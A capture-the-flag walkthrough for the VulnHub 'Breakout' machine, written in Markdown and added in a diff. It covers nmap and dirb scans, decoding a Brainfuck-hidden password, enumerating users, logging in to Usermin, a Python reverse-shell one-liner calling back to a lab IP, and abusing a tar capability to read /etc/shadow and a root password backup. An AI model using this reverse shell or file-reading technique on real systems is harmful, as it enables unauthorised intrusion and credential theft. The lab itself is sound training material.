@@ -1,0 +1,256 @@
+# Matrix-Breakout-2 CTF Walkthrough
+ 
+The goal of this **Capture the Flag (CTF)** is to gain root access to the target machine. Prerequisites: familiarity with Linux commands and basic penetration testing tools.
+ 
+🔗 **Download the CTF:**
+[https://download.vulnhub.com/empire/02-Breakout.zip](https://download.vulnhub.com/empire/02-Breakout.zip)
+ 
+---
+ 
+---
+ 
+## Walkthrough Stages
+ 
+1. Get the **target machine's IP address** and scan its **open ports** with **nmap**.
+2. Explore **HTTP port 80** with **dirb**.
+3. Explore the other **HTTP port, 20000**.
+4. Get a **reverse shell via Python** and perform **privilege escalation**.
+With all the necessary info in hand, let's get started!
+ 
+## Step-by-Step CTF Walkthrough
+### **Step 1: Get the target machine's IP address and scan open ports with nmap**
+To determine the IP address and scan the target machine, we use the commands:
+ 
+```bash
+   sudo netdiscover -r 192.168.56.105/24
+```
+ 
+```bash
+nmap -sV 192.168.56.105  
+```  
+ 
+ 
+**We get the following result:**
+ 
+![nmap](./src/nmap.png)
+ 
+## **Step 2**
+ 
+### **Exploring the web server on port 80**
+ 
+To start exploring the target machine, let's try to access its **HTTP service** on the **standard port 80**. We open the target machine's **IP address** in a browser.
+ 
+#### **Result:**
+The screen shows the **default Apache page**, indicating an **active web server**. However, we don't yet know whether other web applications exist there, so we need to find the **correct path** to them.
+ 
+---
+ 
+### **Searching for web application directories**
+ 
+For this, we use a **web directory brute-forcing tool**. One of the most effective tools is **dirb**, which is already included in **Kali Linux**.
+ 
+**Scan command:**
+```bash
+dirb http://192.168.56.105
+```
+ 
+#### **Result:**
+We discovered a **"manual" directory** on the web server. Opening it in a browser showed the **default Apache site**.
+ 
+ 
+#### **Finding a vulnerability/hidden hint**
+ 
+While reviewing the **page's HTML code**, we found an interesting comment containing **encoded user data**.
+ 
+![devtools](./src/devtools.png)
+ 
+**Encoded password found:**
+```
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
+```
+ 
+#### **Code analysis:**
+- We examined the characters used and determined this was **Brainfuck** — a programming language that can be used to **encode text**.
+- Using an **online Brainfuck decoder**, we decoded this string.
+
+![decodedbrfck](./src/brainfckdecoded.png)
+ 
+#### **Decoded password:**
+```
+.2uqPEfj3D<P'a-3
+```
+ 
+### **Conclusion:**
+We obtained a **plaintext password** from port 80. Now let's move on to exploring **ports 10000 and 20000** to find new exploitation opportunities on the target machine.
+ 
+## **Step 3**
+ 
+**Exploring HTTP ports 10000 and 20000**
+ 
+We opened the **target machine's IP address** in a browser, using **port 10000** and **port 20000**.
+We found an admin panel on port **10000** — **Webmin** — and a user panel on port **20000** — **Usermin**. Since we know the user's password but not the username, let's search for the username next.
+ 
+![minports](./src/minports.png)
+ 
+---
+ 
+#### **Finding the username**
+ 
+**We have the password but don't know the username**
+We use the **enum4linux** tool.
+ 
+**Scan command:**
+ 
+```bash
+enum4linux -a 192.168.56.105
+```
+ 
+#### **Result:**
+We got **a large amount of information**, among which we found the **user "cyber"**.
+ 
+![usercyber](./src/enum4linux.png)
+ 
+ 
+**Checking authentication**
+ 
+With the **username ("cyber") and password** in hand, we tried **SSH access**, but it didn't work.
+We then logged in via the **Usermin web interface**, and it **worked**!
+ 
+![userminlogin](./src/usermin.png)
+ 
+**Result:**
+We got into the **Usermin admin panel**.
+ 
+---
+ 
+#### **Getting a Usermin terminal**
+ 
+Usermin has an **option for web terminal access**.
+We ran the `id` command, which confirmed we were logged in **as the user "cyber"**.
+ 
+  ![alt text](./src/usermincomm.png) 
+ 
+**We checked the files in Usermin -> Tools -> File Manager**
+**We found the first flag ("user.txt")!**
+ 
+```text
+3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
+```
+ 
+ ![alt text](./src/usertxt.png)
+ 
+---
+ 
+#### **Next step:**
+Get **full command access** to the target machine!
+ 
+## **Step 4**
+ 
+#### **Getting a reverse shell**
+ 
+We have terminal access to the target machine. Now let's try to get a **reverse shell** using a specially crafted **Python payload**.
+ 
+**Payload:**
+```python
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+ 
+**`netcat` setup on the attacking machine:**
+```bash
+nc -lvp 4444
+```
+ 
+**Result:**
+The attacking machine successfully received a **reverse shell**!
+Now we can explore the system for vulnerabilities.
+ 
+![revshell](./src/rshell.png)
+ 
+**Checking the OS and kernel**
+ 
+**Commands:**
+```bash
+cat /etc/issue
+uname -a
+```
+**Result:**
+We obtained information about the **operating system and Linux kernel version**.
+We checked public vulnerability databases but found no ready-made exploits.
+ 
+---
+ 
+**Searching for binaries with elevated privileges**
+ 
+**Commands:**
+```bash
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+```
+![revshell](./src/cap.png) 
+ 
+**Result:**
+We discovered that **cap_dac_read_search** allows reading any file!
+We can use this to view protected files on the system.
+ 
+**Attempting to read `/etc/shadow`**
+
+**Command:**
+```bash
+./tar -cf shadow.tar /etc/shadow
+tar -xOf shadow.tar
+```
+
+![revshell](./src/shadow.png) 
+
+We tried cracking the hashed passwords using **John the Ripper**, but without success.
+ 
+**Searching for a plaintext password**
+ 
+**Command:**
+```bash
+ls -la /var/backups/
+```
+**Result:**
+We found a **password backup file** (`.old_pass.bak`).
+It is accessible only to **root**, but we can use **tar** to bypass this restriction.
+ 
+---
+ 
+**Changing access permissions and reading the password file**
+ 
+🔹 **Commands:**
+```bash
+./tar -cf password.tar /var/backups/.old_pass.bak
+tar -xOf password.tar
+```
+**Result:**
+The password was found in **plaintext**!
+ 
+![oldpass](./src/oldpass.png)
+ 
+**Password found:**
+```text
+Ts&4&YurgtRX(=~h
+```
+ 
+---
+ 
+**Escalating privileges to root**
+ 
+🔹 **Command:**
+```bash
+su root
+```
+**Result:**
+**Successfully logged in as root!**
+ 
+🔹 **Reading the final flag:**
+```bash
+cat /root/rOOt.txt
+```
+![oldpass](./src/root.png)
+ 
+**Final flag:**
+```text
+3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
+```
